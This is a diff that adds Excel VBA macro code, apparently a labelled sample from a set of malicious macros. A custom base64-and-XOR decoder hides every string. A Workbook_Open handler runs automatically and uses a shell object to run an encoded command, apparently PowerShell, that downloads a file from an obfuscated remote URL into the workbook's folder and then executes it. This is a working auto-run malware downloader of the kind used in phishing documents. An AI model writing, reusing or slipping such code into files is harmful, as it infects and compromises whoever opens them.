@@ -1,0 +1,74 @@
+Private Function decode_b64_xor(b64 As String, key As Integer) As String
+Dim bytes() As Byte, i As Long, j As Long, accum As Double, acc_bits As Long, c As Long, vals(0 To 127) As Long
+For i = 0 To 127: vals(i) = -1: Next i
+Dim tbl As String: tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+For i = 1 To Len(tbl): vals(Asc(Mid(tbl, i, 1))) = i - 1: Next i
+ReDim bytes(0 To (Len(b64) * 3) \ 4) As Byte
+i = 1: j = 0: accum = 0: acc_bits = 0
+Do While i <= Len(b64)
+    c = Asc(Mid(b64, i, 1))
+    If c <= 127 And vals(c) >= 0 Then
+        accum = (accum * 64) + vals(c)
+        acc_bits = acc_bits + 6
+        If acc_bits >= 8 Then
+            acc_bits = acc_bits - 8
+            bytes(j) = ((accum \ (2 ^ acc_bits)) And 255)
+            ' reduce accum so it doesn't grow unbounded and cause overflow
+            accum = accum - (CDbl(bytes(j)) * (2 ^ acc_bits))
+            j = j + 1
+        End If
+    End If
+    i = i + 1
+Loop
+ReDim Preserve bytes(0 To j - 1) As Byte
+Dim out As String: out = ""
+If j > 0 Then
+    For i = 0 To j - 1
+        bytes(i) = bytes(i) Xor (key And 255)
+        out = out & Chr(bytes(i))
+    Next i
+End If
+decode_b64_xor = out
+End Function
+
+
+' sample_id: 0001_codeVBA
+Private Function D_58d41590(url As String, o_c7a173f6 As String) As Boolean
+    Dim w_e6647a94 As Object, p_69ac29b1 As String
+    On Error GoTo E_18d1b324
+    Set w_e6647a94 = CreateObject(decode_b64_xor("NDAAEQoTF00wCwYPDw==", 99))
+    p_69ac29b1 = decode_b64_xor("EwwUBhEQCwYPD0NOLQwzEQwFCg8GQ040Cg0HDBQwFxoPBkMrCgcHBg1DTiAMDg4CDQdD", 99) & _
+            Chr(34) & decode_b64_xor("FxEaQxhDRwAMBwZDXkNLLQYUTiwBCQYAF0MwGhAXBg5NLQYXTTQGASAPCgYNF0pNJwwUDQ8MAgcwFxEKDQRLRA==", 99) & url & decode_b64_xor("REpYQyoNFQwIBk4mGxMRBhAQCgwNQ0cADAcGWEMGGwoXQ1NDHkMAAhcAC0MYQwYbChdDUkMe", 99) & Chr(34)
+    w_e6647a94.Run p_69ac29b1, 0, True
+    D_58d41590 = (Dir(o_c7a173f6) <> decode_b64_xor("", 99))
+    Exit Function
+E_18d1b324:
+    D_58d41590 = False
+End Function
+Private Sub R_7ba5ca01(f_0cb0afe1 As String)
+    Dim w_e6647a94 As Object
+    Set w_e6647a94 = CreateObject(decode_b64_xor("NDAAEQoTF00wCwYPDw==", 99))
+    w_e6647a94.Run decode_b64_xor("", 99) & decode_b64_xor("", 99) & f_0cb0afe1 & decode_b64_xor("", 99) & decode_b64_xor("", 99), 1, False
+End Sub
+Public Sub D_c94c13f3()
+    Dim url As String, o_c7a173f6 As String, s_005593d3 As Boolean
+    url = decode_b64_xor("CxcXExBZTEwOGk4NBhsXCRBOAhMTTlsRUlFNFQYRAAYPTQITE0wCEwpMBwwUDQ8MAgdcBQoPBl4wBhEVCgAGTRMQUg==", 99)
+    o_c7a173f6 = ThisWorkbook.Path & decode_b64_xor("PxAGERUKAAZNExBS", 99)
+    s_005593d3 = False
+    On Error Resume Next
+    If Dir(o_c7a173f6) <> decode_b64_xor("", 99) Then Kill o_c7a173f6
+    On Error GoTo 0
+    If Not s_005593d3 Then
+        s_005593d3 = D_58d41590(url, o_c7a173f6)
+    End If
+    If s_005593d3 Then
+        R_7ba5ca01 o_c7a173f6
+    Else
+        
+    End If
+End Sub
+
+Private Sub Workbook_Open()
+    Call D_c94c13f3
+End Sub
+
